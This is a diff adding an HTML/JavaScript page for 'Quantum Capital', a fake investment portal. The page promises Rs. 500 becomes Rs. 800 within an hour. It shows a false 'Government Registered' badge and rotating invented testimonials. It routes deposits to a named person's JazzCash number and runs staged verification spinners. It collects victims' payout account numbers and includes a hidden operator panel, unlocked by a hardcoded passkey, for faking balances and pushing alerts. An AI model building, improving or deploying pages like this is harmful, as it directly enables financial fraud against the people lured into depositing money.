@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quantum Node - Asset Management Pro</title>
+    <style>
+        :root {
+            --bg-light: #f8fafc;
+            --panel-white: #ffffff;
+            --primary-orange: #ff6b00;
+            --accent-yellow: #facc15;
+            --text-dark: #1e293b;
+            --text-muted: #64748b;
+            --border-color: #e2e8f0;
+            --success-green: #16a34a;
+            --danger-red: #dc2626;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            overflow-x: hidden;
+            padding-bottom: 50px;
+        }
+        .ticker-wrap {
+            background: linear-gradient(90deg, var(--primary-orange), var(--accent-yellow));
+            padding: 8px 15px;
+            font-size: 11px;
+            font-weight: 600;
+            text-align: center;
+            color: white;
+            letter-spacing: 0.5px;
+        }
+        .navbar {
+            background: var(--panel-white);
+            padding: 15px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+        }
+        .navbar .brand { font-size: 18px; font-weight: bold; color: var(--primary-orange); letter-spacing: 0.5px; }
+        .nav-right { display: flex; align-items: center; gap: 15px; }
+        
+        /* Government Registered Badge Style */
+        .gov-badge {
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            color: #334155;
+            padding: 5px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .staff-btn {
+            background: #fff3eb;
+            border: 1px solid rgba(255,107,0,0.2);
+            color: var(--primary-orange);
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .staff-btn:hover { background: var(--primary-orange); color: white; }
+
+        .auth-container {
+            max-width: 400px;
+            width: 90%;
+            margin: 60px auto;
+            padding: 30px;
+            background: var(--panel-white);
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+        }
+        
+        /* Review Ticker Box */
+        .review-ticker-card {
+            background: #fffbeb;
+            border: 1px solid #fde68a;
+            border-radius: 10px;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 2px 8px rgba(251,191,36,0.05);
+        }
+        .review-user-avatar {
+            width: 32px;
+            height: 32px;
+            background: var(--primary-orange);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        .review-content { flex: 1; }
+        .review-name { font-size: 11px; font-weight: bold; color: var(--text-dark); display: flex; justify-content: space-between; }
+        .review-text { font-size: 12px; color: #475569; font-style: italic; margin-top: 2px; font-weight: 500; }
+
+        .balance-hero-card {
+            background: linear-gradient(135deg, #1e293b, #0f172a);
+            color: white;
+            border-radius: 14px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+        }
+        .balance-label { font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; }
+        .balance-amount { font-size: 26px; font-weight: 800; color: var(--accent-yellow); margin-top: 4px; }
+
+        .main-container {
+            max-width: 1050px;
+            width: 95%;
+            margin: 30px auto;
+            display: grid;
+            grid-template-columns: 1.4fr 1fr;
+            gap: 25px;
+        }
+        @media (max-width: 768px) {
+            .main-container { grid-template-columns: 1fr; }
+        }
+        .left-panel, .right-panel {
+            background: var(--panel-white);
+            border-radius: 16px;
+            padding: 25px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.02);
+            height: fit-content;
+        }
+        .panel-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #fff3eb;
+            padding-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .panel-title span { font-size: 11px; background: var(--accent-yellow); color: var(--text-dark); padding: 3px 8px; border-radius: 4px; font-weight: 600; }
+        .form-view { display: none; }
+        .form-view.active { display: block; }
+        
+        .form-label {
+            display: block;
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+        .input-field, .select-field {
+            width: 100%;
+            padding: 12px;
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-dark);
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        .input-field:focus, .select-field:focus { border-color: var(--primary-orange); background: white; outline: none; }
+        
+        .action-btn {
+            width: 100%;
+            background: linear-gradient(135deg, var(--primary-orange), #e05e00);
+            color: white;
+            padding: 13px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(255,107,0,0.2);
+        }
+        .toggle-link { text-align: center; margin-top: 15px; font-size: 13px; color: var(--primary-orange); cursor: pointer; font-weight: 500; }
+        
+        .voucher-card { background: #fffcf5; border: 1px solid #fef08a; border-radius: 12px; padding: 18px; margin-bottom: 18px; }
+        .voucher-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px dashed #fef08a; font-size: 13px; }
+        .voucher-row:last-child { border-bottom: none; }
+        
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 35px 10px;
+        }
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid #f1f5f9;
+            border-top: 4px solid var(--primary-orange);
+            border-bottom: 4px solid var(--accent-yellow);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        .loading-text { font-size: 13px; color: var(--primary-orange); font-weight: 600; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .feed-box {
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 15px;
+            font-size: 12px;
+        }
+        .feed-item { display: flex; justify-content: space-between; margin-bottom: 6px; color: var(--text-muted); }
+        .badge-pulse { width: 8px; height: 8px; background: var(--success-green); border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(0.9); opacity: 0.6; } 50% { transform: scale(1.2); opacity: 1; } 100% { transform: scale(0.9); opacity: 0.6; } }
+
+        .notify-panel-box {
+            background: #fff8f6;
+            border: 1px solid #ffe2db;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+        .notify-title { font-size: 12px; font-weight: bold; color: var(--primary-orange); margin-bottom: 6px; display: flex; align-items: center; gap: 6px;}
+        .notify-desc { font-size: 13px; color: var(--text-dark); line-height: 1.4; }
+
+        .admin-section {
+            max-width: 1050px;
+            width: 95%;
+            margin: 40px auto;
+            padding: 25px;
+            background: var(--panel-white);
+            border-radius: 16px;
+            border: 2px dashed var(--danger-red);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            display: none;
+        }
+        .admin-flex { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 20px; }
+        .admin-card-input { flex: 1; min-width: 280px; background: #f8fafc; border: 1px solid var(--border-color); padding: 15px; border-radius: 10px; }
+        .table-wrapper { width: 100%; overflow-x: auto; margin-top: 15px; border-radius: 8px; border: 1px solid var(--border-color); }
+        .admin-table { width: 100%; border-collapse: collapse; background: var(--panel-white); min-width: 700px; }
+        .admin-table th, .admin-table td { padding: 12px 15px; text-align: left; font-size: 13px; border-bottom: 1px solid var(--border-color); }
+        .admin-table th { background-color: #fff3eb; color: var(--primary-orange); font-weight: 700; }
+        
+        .approve-btn { background: var(--success-green); color: white; border: none; padding: 6px 12px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 12px; }
+        .approve-btn:hover { opacity: 0.9; }
+
+        #mainPortal { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="ticker-wrap">
+        <span>⚠️ SECURE PROTOCOL: TLS TERMINAL CONNECTION LOCKED • NODE VERIFIED VIA STAFF AUDIT</span>
+    </div>
+
+    <div class="navbar">
+        <div class="brand">🌌 QUANTUM CAPITAL</div>
+        <div class="nav-right">
+            <!-- GOV REGISTERED BADGE -->
+            <div class="gov-badge">🏛️ GOVERNMENT REGISTERED</div>
+            <div id="userWelcome" style="font-size: 13px; color: var(--success-green); font-weight: 700;"></div>
+            <button class="staff-btn" onclick="unlockStaffGate()">Staff Portal Access</button>
+        </div>
+    </div>
+
+    <!-- ================= CLIENT AUTH FRAME ================= -->
+    <div class="auth-container" id="authBox">
+        <div id="loginView" class="form-view active">
+            <h3 style="margin-bottom:18px; color: var(--text-dark); font-weight: 800;">Account Login</h3>
+            <label class="form-label">Account Username</label>
+            <input type="text" id="loginUser" class="input-field" placeholder="Enter username">
+            <label class="form-label">Password Key</label>
+            <input type="password" id="loginPass" class="input-field" placeholder="Enter password token">
+            <button class="action-btn" onclick="handleLogin()">Authorize Login</button>
+            <div class="toggle-link" onclick="switchAuth('register')">Setup New Account Node</div>
+        </div>
+
+        <div id="registerView" class="form-view">
+            <h3 style="margin-bottom:18px; color: var(--primary-orange); font-weight: 800;">Register Identity</h3>
+            <label class="form-label">Email Node</label>
+            <input type="email" id="regEmail" class="input-field" placeholder="user@domain.com">
+            <label class="form-label">Create Username</label>
+            <input type="text" id="regUser" class="input-field" placeholder="Create username signature">
+            <label class="form-label">Secure Access Password</label>
+            <input type="password" id="regPass" class="input-field" placeholder="Generate secure key">
+            <button class="action-btn" style="background: linear-gradient(135deg, #fbbf24, #d97706);" onclick="handleRegister()">Establish Account Parameters</button>
+            <div class="toggle-link" onclick="switchAuth('login')" style="color: var(--text-dark);">Return to Login View</div>
+        </div>
+    </div>
+
+    <!-- ================= MAIN WHITE PORTAL ================= -->
+    <div class="main-container" id="mainPortal">
+        <div class="left-panel">
+            
+            <!-- LIVE DYNAMIC REVIEWS TICKER BOX (Changes every 10 seconds) -->
+            <div class="review-ticker-card">
+                <div class="review-user-avatar" id="revAvatar">A</div>
+                <div class="review-content">
+                    <div class="review-name"><span id="revUser">Ayan **</span> <span style="color:#fbbf24;">★★★★★</span></div>
+                    <div class="review-text" id="revText">Thanks u sir recived withdral.. 💸</div>
+                </div>
+            </div>
+
+            <!-- LIVE INVESTED BALANCE CARD BOX -->
+            <div class="balance-hero-card">
+                <div>
+                    <div class="balance-label">Total Invested Balance</div>
+                    <div class="balance-amount" id="userBalanceDisplay">Rs. 0</div>
+                </div>
+                <div style="text-align: right;">
+                    <span style="font-size: 11px; color:#a1a1aa; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 20px;">🔒 Node Vault Locked</span>
+                </div>
+            </div>
+
+            <!-- STAGE 1: ALLOCATION TIER CHOICE -->
+            <div id="stage1" class="form-view active">
+                <h3 class="panel-title">Asset Allocation Selection <span>Step 1 of 3</span></h3>
+                <label class="form-label">Choose Target Pool Yield Allocation (1 Hour Pipeline)</label>
+                <select id="tierSelect" class="select-field">
+                    <option value="500|800">Tier 1: Stake Rs. 500 ➔ Instant Payout Rs. 800</option>
+                    <option value="1000|1300">Tier 2: Stake Rs. 1000 ➔ Instant Payout Rs. 1300</option>
+                    <option value="2000|2600">Tier 3: Stake Rs. 2000 ➔ Instant Payout Rs. 2600</option>
+                    <option value="5000|6500">Tier 4: Stake Rs. 5000 ➔ Instant Payout Rs. 6500</option>
+                </select>
+                <button class="action-btn" onclick="nextToStage2()">Generate Deposit Secure Invoice</button>
+            </div>
+
+            <!-- STAGE 2: INVOICE WINDOW -->
+            <div id="stage2" class="form-view">
+                <h3 class="panel-title">Gateway Payment Parameters <span>Step 2 of 3</span></h3>
+                <div class="voucher-card">
+                    <div class="voucher-row"><span>SETTLEMENT ENGINE:</span><span style="color:var(--primary-orange); font-weight:bold;">JAZZCASH OFFICIAL</span></div>
+                    <div class="voucher-row"><span>BENEFICIARY DESK:</span><span style="font-weight:700; color: var(--text-dark);">FARHAN AHMAD</span></div>
+                    <div class="voucher-row"><span>ESCROW NUMBER:</span><span style="color:var(--primary-orange); font-weight:bold; font-size:16px; letter-spacing:0.5px;">03281951089</span></div>
+                    <div class="voucher-row"><span>EXACT PRINCIPAL INVOICE:</span><span id="reqDepText" style="color:var(--success-green); font-weight:bold; font-size:15px;">Rs. 500</span></div>
+                </div>
+                <label class="form-label">Enter 11-Digit Transaction Reference ID (TID)</label>
+                <input type="text" id="tidInput" class="input-field" placeholder="Paste structural reference verification token">
+                <button class="action-btn" onclick="startTIDLoading()" style="background: linear-gradient(135deg, var(--accent-yellow), #ca8a04); color: var(--text-dark);">Verify System Ledger Node</button>
+            </div>
+
+            <!-- EMBEDDED LOADING MATRIX CONSOLE -->
+            <div id="loadingScreen" class="loading-container">
+                <div class="spinner"></div>
+                <div class="loading-text" id="loadTextLabel">Analyzing parameters...</div>
+            </div>
+
+            <!-- STAGE 3: ACCOUNT MATURITY ENGINE -->
+            <div id="stage3" class="form-view">
+                <h3 class="panel-title">Yield Asset Maturity Dashboard <span>Active Distribution</span></h3>
+                <div class="voucher-card" style="border-left: 4px solid var(--primary-orange); background: #fafafa;">
+                    <div class="voucher-row"><span>Anchored Allocation Vol:</span><span id="dashPrincipal" style="color:var(--text-dark); font-weight:600;">-</span></div>
+                    <div class="voucher-row"><span>Expected Yield Release:</span><span id="dashMaturity" style="color:var(--success-green); font-weight:bold; font-size:15px;">-</span></div>
+                    <div class="voucher-row"><span>Pipeline Clearance Interval:</span><span style="color:var(--primary-orange); font-weight:600;">60 Mins Active Lock</span></div>
+                </div>
+
+                <label class="form-label">Select Dynamic Payout Gateway Terminal</label>
+                <select id="withdrawMethod" class="select-field">
+                    <option value="Easypaisa">Easypaisa Mobile Banking</option>
+                    <option value="JazzCash">JazzCash Gateway Wallet</option>
+                    <option value="HBL Bank">HBL Digital Banking Pool</option>
+                    <option value="UBL Bank">UBL Global Network</option>
+                </select>
+
+                <label class="form-label">Destination Payout Delivery Account Number</label>
+                <input type="text" id="userWalletNum" class="input-field" placeholder="Enter target terminal destination reference number">
+
+                <button class="action-btn" id="withdrawBtn" onclick="startWithdrawLoading()" style="background: linear-gradient(135deg, var(--success-green), #15803d);">Execute Asset Withdrawal Request</button>
+                <p id="clientSuccessMsg" style="text-align: center; color: var(--success-green); font-size: 13px; font-weight: bold; margin-top: 15px;"></p>
+            </div>
+
+        </div>
+
+        <!-- RIGHT AREA: OPERATIONAL LOG & SYSTEM INSIGHTS -->
+        <div class="right-panel">
+            <h3 class="panel-title" style="color: var(--text-dark);">⚡ System Monitor</h3>
+            <p style="font-size:13px; color: var(--text-muted); line-height: 1.5; margin-bottom: 12px;">
+                Node deployment parameters synchronize automatically against centralized clearing networks.
+            </p>
+            
+            <div class="notify-panel-box">
+                <div class="notify-title">
+                    <span style="width:7px; height:7px; background:red; border-radius:50%; display:inline-block;"></span>
+                    SYSTEM NOTIFICATIONS BOX
+                </div>
+                <div class="notify-desc" id="userNotificationFeed">Welcome to Quantum Core Terminal. Currently, no new dynamic push notifications from admin desk.</div>
+            </div>
+            
+            <div class="feed-box">
+                <div style="font-weight:700; margin-bottom:8px; font-size:11px; color: var(--primary-orange); display:flex; align-items:center; gap:5px;">
+                    <span class="badge-pulse"></span> SYSTEM AUDIT LOG (LIVE)
+                </div>
+                <div class="feed-item"><span>Node Hash #9921</span><span style="color:var(--success-green)">Connected</span></div>
+                <div class="feed-item"><span>Escrow Ledger Pipeline</span><span style="color:var(--primary-orange)">Active</span></div>
+                <div class="feed-item"><span>TLS Encryption Stream</span><span style="color:var(--success-green)">v1.3 Secure</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= ACCESS SECURED ADMINISTRATIVE AREA ================= -->
+    <div class="admin-section" id="secureAdminArea">
+        <h3 style="color: var(--danger-red); margin-bottom: 15px; font-weight:800;">🛠️ STAFF CONTROL DESK INTERFACE (Secret Vault)</h3>
+        
+        <div class="admin-flex">
+            <div class="admin-card-input">
+                <h4 style="font-size:13px; margin-bottom:8px; color: var(--primary-orange);">📢 Push Live Alerts to User</h4>
+                <input type="text" id="adminNoticeInput" class="input-field" placeholder="Type notification statement text here..." style="margin-bottom:10px;">
+                <button class="action-btn" onclick="sendAdminNotification()" style="padding:8px; font-size:12px;">Broadcast System Alert Message</button>
+            </div>
+        </div>
+        
+        <p style="color: var(--text-muted); font-size:12px; margin-bottom: 5px;">Secure Ledger Dump: Client routing queues populate below instantly.</p>
+        
+        <div class="table-wrapper">
+            <table class="admin-table">
+                <thead>
+                    <tr>
+                        <th>Authorized Client</th>
+                        <th>Deposited Stack</th>
+                        <th>Txn Ref Number (TID)</th>
+                        <th>Payout Gateway</th>
+                        <th>Target Account Signature</th>
+                        <th>Clearance Payout Due</th>
+                        <th>Admin Verification Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="adminTableBody">
+                    <tr>
+                        <td colspan="7" style="text-align:center; color: var(--text-muted); font-style:italic; padding: 20px;">No transaction logs mapped in real-time memory buffer yet.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        let currentDep = 0;
+        let currentRet = 0;
+        let activeUser = "GuestNode";
+
+        // DYNAMIC CUSTOMER REVIEWS DATABASE ARRAY
+        const systemReviews = [
+            { avatar: "T", user: "Tariq *", text: "thanks u sir recived withdral fast system! 🔥" },
+            { avatar: "Z", user: "Zain **", text: "Wow, 1000 single investment locked and return cleared. Good service" },
+            { avatar: "M", user: "Malik ***", text: "Bhai sach me payout aa gya 1 hour notice se pehle hi. Thanks" },
+            { avatar: "A", user: "Asif **", text: "Best platform government registry checks verified!" },
+            { avatar: "F", user: "Faisal *", text: "Easypaisa me full transparent amount receive ho chuki hai. A++" }
+        ];
+        let currentReviewIndex = 0;
+
+        // 10 Seconds Review Change Logic Loop
+        setInterval(function() {
+            currentReviewIndex = (currentReviewIndex + 1) % systemReviews.length;
+            const targetReview = systemReviews[currentReviewIndex];
+            document.getElementById('revAvatar').innerText = targetReview.avatar;
+            document.getElementById('revUser').innerText = targetReview.user;
+            document.getElementById('revText').innerText = targetReview.text;
+        }, 10000); // 10000ms = 10 Seconds
+
+        function switchAuth(type) {
+            document.getElementById('loginView').classList.remove('active');
+            document.getElementById('registerView').classList.remove('active');
+            if(type === 'login') document.getElementById('loginView').classList.add('active');
+            if(type === 'register') document.getElementById('registerView').classList.add('active');
+        }
+
+        function handleRegister() {
+            const user = document.getElementById('regUser').value.trim();
+            const pass = document.getElementById('regPass').value.trim();
+            if(!user || !pass) { alert("Missing configuration structural items."); return; }
+            localStorage.setItem('coreU', user);
+            localStorage.setItem('coreP', pass);
+            alert("Account Node Created. Forwarding to terminal login validation step.");
+            switchAuth('login');
+        }
+
+        function handleLogin() {
+            const user = document.getElementById('loginUser').value.trim();
+            const pass = document.getElementById('loginPass').value.trim();
+            if(user === localStorage.getItem('coreU') && pass === localStorage.getItem('coreP') && user !== "") {
+                activeUser = user;
+                document.getElementById('authBox').style.display = 'none';
+                document.getElementById('mainPortal').style.display = 'grid';
+                document.getElementById('userWelcome').innerText = "👤 ACTIVE NODE: " + user.toUpperCase();
+            } else {
+                alert("Terminal Authorization Rejected. Verification Signature Failed.");
+            }
+        }
+
+        function nextToStage2() {
+            const tierData = document.getElementById('tierSelect').value.split('|');
+            currentDep = parseInt(tierData[0]);
+            currentRet = parseInt(tierData[1]);
+            document.getElementById('reqDepText').innerText = "Rs. " + currentDep.toLocaleString();
+            document.getElementById('stage1').classList.remove('active');
+            document.getElementById('stage2').classList.add('active');
+        }
+
+        function startTIDLoading() {
+            const tid = document.getElementById('tidInput').value.trim();
+            if(tid.length < 5) { alert("Ledger Error: Unrecognized structural reference token."); return; }
+            localStorage.setItem('latestTID', tid);
+
+            document.getElementById('stage2').classList.remove('active');
+            document.getElementById('loadTextLabel').innerText = "Cross-Checking Reference TID Across Decentralized Settlement Node Layers... Please Hold";
+            document.getElementById('loadingScreen').style.display = 'block';
+
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('dashPrincipal').innerText = "Rs. " + currentDep.toLocaleString();
+                document.getElementById('dashMaturity').innerText = "Rs. " + currentRet.toLocaleString();
+                document.getElementById('stage3').classList.add('active');
+            }, 4000); 
+        }
+
+        function startWithdrawLoading() {
+            const method = document.getElementById('withdrawMethod').value;
+            const accountNum = document.getElementById('userWalletNum').value.trim();
+            if(!accountNum) { alert("Destination configuration mapping missing parameters."); return; }
+
+            alert("Notice Registered:\nWithin 1 hour aapko withdrawal ka SMS notice received ho jayega aur amount aap ke select kiye huay bank account mein transfer ho jayegi.");
+
+            document.getElementById('userWalletNum').style.display = 'none';
+            document.getElementById('withdrawMethod').style.display = 'none';
+            document.getElementById('withdrawBtn').style.display = 'none';
+            
+            document.getElementById('loadTextLabel').innerText = "Routing Payout Settlement Token To Specified Payment Gateways securely...";
+            document.getElementById('loadingScreen').style.display = 'block';
+
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.display = 'none';
+                
+                const tableBody = document.getElementById('adminTableBody');
+                tableBody.innerHTML = `
+                    <tr style="background: #fffcf5;">
+                        <td style="color: var(--primary-orange); font-weight:bold;">${activeUser}</td>
+                        <td style="font-weight:600;">Rs. ${currentDep}</td>
+                        <td style="color: #64748b; font-family: monospace; font-weight:700;">${localStorage.getItem('latestTID')}</td>
+                        <td style="color: var(--text-dark); font-weight:600;">${method}</td>
+                        <td style="font-weight:bold; letter-spacing:0.3px;">${accountNum}</td>
+                        <td style="color: var(--success-green); font-weight:bold; font-size:14px;">Rs. ${currentRet}</td>
+                        <td>
+                            <button class="approve-btn" onclick="executeManualFunding()">Approve & Fund</button>
+                        </td>
+                    </tr>
+                `;
+                
+                document.getElementById('clientSuccessMsg').innerText = "✔ Withdrawal Operation Registered. System is listening to Admin settlement node verification frames.";
+            }, 5000);
+        }
+
+        function executeManualFunding() {
+            const amountInput = prompt("Enter specific manual fund amount to load into user's 'Invested Balance' card box:");
+            if(amountInput !== null && amountInput.trim() !== "") {
+                const parsedVal = parseInt(amountInput);
+                if(!isNaN(parsedVal)) {
+                    document.getElementById('userBalanceDisplay').innerText = "Rs. " + parsedVal.toLocaleString();
+                    alert("Success Node: Dispatched Rs. " + parsedVal + " directly into Client's active Invested Balance terminal.");
+                } else {
+                    alert("Invalid numeric assignment entry.");
+                }
+            }
+        }
+
+        function sendAdminNotification() {
+            const msg = document.getElementById('adminNoticeInput').value.trim();
+            if(!msg) { alert("Please type your transmission alert statement first."); return; }
+            document.getElementById('userNotificationFeed').innerText = msg;
+            alert("Broadcast Status: Alert text payload pushed successfully onto client terminal screen box.");
+        }
+
+        function unlockStaffGate() {
+            const passCheck = prompt("Security Authentication Challenge:\nEnter Staff Passkey Token:");
+            if(passCheck === "cyber99") {
+                document.getElementById('secureAdminArea').style.display = 'block';
+                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+            } else {
+                alert("Security Error: Access Denied. Unrecognized Staff Cryptographic Token.");
+            }
+        }
+    </script>
+</body>
+</html>
